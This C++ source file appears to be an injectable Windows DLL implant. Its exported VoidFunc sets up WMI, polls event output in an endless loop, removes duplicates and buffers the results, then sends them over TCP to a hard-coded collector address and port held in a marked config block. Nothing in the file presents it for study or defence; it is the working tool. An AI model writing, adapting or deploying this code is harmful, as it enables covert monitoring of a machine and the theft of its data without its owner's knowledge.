#pragma once
#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)
#include <stdio.h>
#include <sstream>
#include <string>
#include <vector>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <algorithm>
#include "wmiEvhead.h"
#include "thread"
#include "tcpclient.h"
#include "stdafx.h"

/* Make function exportable.  Required name is voidfunc*/
EXTERN_DLL_EXPORT VOID VoidFunc(LPVOID lpParam)
{

	std::string hashlist;
	std::string output;
	std::string output_buffer;
	std::vector<std::string> hashlog;
	char *loggerIp;
	int loggerPort;
	bool conn;

	/*CONFIG_START */
	loggerIp = "172.16.110.50";
	loggerPort = 2327;
	/*CONFIG_END*/

	char *pLoggerIp = loggerIp;
	int sendFail = 0;
	int res = NULL;
	IWbemServices *pSvc = wmiSetup();

	while (true)
	{
		output = getOutput(pSvc);
		std::this_thread::sleep_for(2s);

		if (output != "")
		{
			std::string outputHash = makehash(output);
			bool hashcheck = in_array(outputHash, hashlog);
			if (hashcheck)
			{
				output.clear();
				std::this_thread::sleep_for(2s);
			}
			else
			{
				hashlog.push_back(outputHash);
				/* Buffer the output in case connection fails. */
				output_buffer.append(output);

				/* Send the output. */
				conn = (ConnectToHost(loggerPort, loggerIp));

				if (conn == false)
				{
					sendFail = 1;
					cout << "[-] Connection Failed...";
				}

				else
				{
					/* Check for a previous failed send attempt. */
					switch (sendFail)
					{
					case 0:
						/* No Previous fails. Send just the current output. */
						res = sendData(output);
						break;
					case 1:
						/* Previous fail occurred. Send whole buffer. */
						res = sendData(output_buffer);
						break;
					}

					if (res == 0)
					{
						sendFail = 0;
						output_buffer.clear();
					}
					output.clear();
					std::this_thread::sleep_for(2s);
				}

				std::this_thread::sleep_for(2s);

			}
		}
	}

}

